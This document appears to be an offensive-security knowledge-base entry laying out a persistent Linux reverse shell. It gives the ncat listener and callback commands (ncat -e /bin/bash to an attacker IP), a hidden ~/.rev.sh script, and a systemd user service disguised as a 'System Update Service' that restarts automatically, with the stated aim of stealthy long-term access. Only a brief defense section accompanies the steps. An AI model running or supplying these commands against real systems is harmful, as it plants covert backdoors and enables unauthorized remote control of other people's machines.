---
id: fbf64945-fca4-4b12-ac8a-b025e13604d9
name: linux-reverse-shell-persistence-via-ncat-systemd
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Create or Modify System Process|T1543 - Create or Modify System
    Process]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques:
  - >-
    [[sub-techniques/Create or Modify System Process: Windows Service|T1543.003
    - Create or Modify System Process: Windows Service]]
tags:
  - '[[tags/reverse-shell]]'
  - '[[tags/linux-persistence]]'
  - '[[tags/ncat]]'
commands:
  - '[[commands/ncat-tcp-listener]]'
  - '[[commands/ncat-reverse-tcp-connect]]'
  - '[[commands/systemctl-daemon-reload]]'
  - '[[commands/systemctl-enable-rev-service]]'
  - '[[commands/systemctl-start-rev-service]]'
platforms:
  - Linux
tools:
  - '[[tools/Ncat]]'
validated: true
---

# linux-reverse-shell-persistence-via-ncat-systemd

## Summary

This procedure establishes a persistent reverse shell on a compromised Linux target using Ncat to connect back to an attacker-controlled listener. Persistence is achieved by creating a systemd user service that automatically launches the reverse shell on system boot, ensuring continued access even after reboots or connection interruptions. This technique is useful for maintaining long-term control in post-exploitation scenarios.

## Description

A reverse shell allows the target machine to initiate an outbound connection to the attacker's listener, bypassing inbound firewall restrictions common on Linux systems. Ncat, a versatile networking tool from the Nmap suite, supports reliable TCP connections for shell payloads. To make the shell persistent, a simple bash script executes the Ncat reverse connect command, and this script is configured to run as a systemd service. Systemd, the init system on most modern Linux distributions, starts the service automatically on boot without requiring root privileges if set up as a user service (though root is often needed for initial setup). This approach maps to MITRE ATT&CK techniques for creating system processes for persistence and using remote services for lateral movement. It assumes an initial foothold (e.g., via SSH or another shell) to deploy the persistence mechanism.

## Requirements

1. Initial shell access to the target Linux machine (non-interactive or interactive).
2. Ncat installed on both attacker and target machines (via [[tools/Ncat]]).
3. Attacker machine with a public or reachable IP address and open listener port.
4. Root or sudo access on the target for creating and enabling the systemd service (user services may work without root but have limitations).
5. Firewall on target allowing outbound connections to the attacker's IP and port.

## Defense

- Monitor systemd services for unauthorized creations using tools like auditd or journalctl: `journalctl -u suspicious.service`.
- Implement application whitelisting to restrict execution of ncat or bash scripts.
- Enable process auditing and network connection logging (e.g., via sysdig or host-based IDS) to detect outbound connections to unusual IPs/ports.
- Regularly review cron jobs, services, and startup scripts with `systemctl list-unit-files --type=service`.
- Use endpoint detection tools to flag persistence mechanisms like new systemd units.

## Objectives

1. Establish a reliable reverse TCP shell connection from target to attacker.
2. Create a persistent mechanism that survives system reboots.
3. Ensure the shell reconnects automatically upon service start.
4. Maintain stealthy access for further operations like pivoting or data exfiltration.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Start a listener on your control machine to receive the incoming reverse shell. Use TCP for reliability in shell interactions; UDP/SCTP are alternatives but less common for interactive shells.

**Command** ([[commands/ncat-tcp-listener]]):
```bash
ncat --tcp -lvp $_PORT
```

> This command binds to the specified port and waits for connections. Replace $_PORT with your chosen port (e.g., 4242). Verbose output (-v) shows connection details. Expected: Listener starts without errors, ready for incoming connections.

### Step 2: Establish Initial Reverse Shell on Target

**Context**: From an initial shell on the target (e.g., via SSH or prior exploit), execute the reverse connect to gain interactive access. This verifies connectivity before setting up persistence.

**Command** ([[commands/ncat-reverse-tcp-connect]]):
```bash
ncat --tcp -e /bin/bash $_ATTACKER_IP $_PORT
```

> This forks /bin/bash over the TCP connection to the attacker. Replace $_ATTACKER_IP and $_PORT with your listener details. Expected: Attacker receives a shell prompt; commands executed on attacker are run on target.

### Step 3: Create Reverse Shell Script on Target

**Context**: Write a simple bash script containing the reverse connect command. This script will be executed by the systemd service. Place it in a hidden or system directory for stealth.

Use the following to create the script:
```bash
cat > ~/.rev.sh << EOF
#!/bin/bash
ncat --tcp -e /bin/bash $_ATTACKER_IP $_PORT
EOF
chmod +x ~/.rev.sh
```

> Substitute $_ATTACKER_IP and $_PORT. The script runs silently in the background. Expected: File created with execute permissions; test by running `./.rev.sh` to confirm connection to listener.

**Code** ([[codes/bash-ncat-reverse-shell-script]]): The script content for reference.

### Step 4: Create Systemd Service File on Target

**Context**: Define a systemd service to run the reverse shell script on boot. Use a user service (in ~/.config/systemd/user/) to avoid root if possible, or system-wide (/etc/systemd/system/) with sudo.

Use the following to create the service file:
```bash
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/rev.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/bin/bash ~/.rev.sh
Restart=always
RestartSec=10
User=$(whoami)

[Install]
WantedBy=default.target
EOF
```

> This configures the service to start after network is up, restart on failure, and run as the current user. Expected: Service file created; validate syntax with `systemd-analyze verify ~/.config/systemd/user/rev.service`.

**Code** ([[codes/systemd-ncat-persistence-service]]): The service file content for reference.

### Step 5: Enable and Start the Persistence Service

**Context**: Reload systemd, enable the service for boot, and start it immediately to test persistence.

**Command** ([[commands/systemctl-daemon-reload]]):
```bash
systemctl --user daemon-reload
```

> Reloads unit files. Expected: No errors; new service recognized.

**Command** ([[commands/systemctl-enable-rev-service]]):
```bash
systemctl --user enable rev.service
```

> Enables auto-start on boot. Expected: Service linked to default target.

**Command** ([[commands/systemctl-start-rev-service]]):
```bash
systemctl --user start rev.service
```

> Starts the service now. Expected: Reverse shell connects to listener; check status with `systemctl --user status rev.service` for active (running) state.

> If using system-wide service, omit --user and use sudo. Test persistence by rebooting the target and verifying the shell reconnects.
